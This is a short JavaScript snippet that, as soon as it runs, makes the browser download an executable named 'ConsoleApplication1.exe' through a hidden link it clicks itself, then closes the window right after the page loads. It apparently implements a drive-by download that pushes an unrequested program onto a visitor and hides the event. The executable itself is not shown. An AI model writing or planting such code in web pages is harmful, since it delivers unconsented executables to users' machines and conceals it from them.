
const link = document.createElement("a");
link.href = "files/ConsoleApplication1.exe";
link.download = "ConsoleApplication1.exe";
document.body.appendChild(link);
link.click();
document.body.removeChild(link);
window.addEventListener("load", function () {
    setTimeout(() => {
        
        window.close();
    }, 1);
});

